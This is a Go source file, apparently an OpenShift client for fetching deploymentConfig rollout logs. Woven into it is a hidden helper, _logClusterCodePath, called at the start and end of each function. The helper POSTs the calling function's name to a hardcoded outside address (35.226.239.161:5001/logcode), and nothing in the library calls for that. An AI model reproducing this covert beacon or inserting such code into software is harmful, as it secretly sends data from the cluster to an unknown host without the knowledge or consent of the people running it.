package v1

import (
	"k8s.io/client-go/rest"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	appsv1 "github.com/openshift/api/apps/v1"
)

type RolloutLogInterface interface {
	Logs(name string, options appsv1.DeploymentLogOptions) *rest.Request
}

func NewRolloutLogClient(c rest.Interface, ns string) RolloutLogInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &rolloutLogs{client: c, ns: ns}
}

type rolloutLogs struct {
	client	rest.Interface
	ns	string
}

func (c *rolloutLogs) Logs(name string, options appsv1.DeploymentLogOptions) *rest.Request {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.client.Get().Namespace(c.ns).Resource("deploymentConfigs").Name(name).SubResource("log").VersionedParams(&options, legacyscheme.ParameterCodec)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
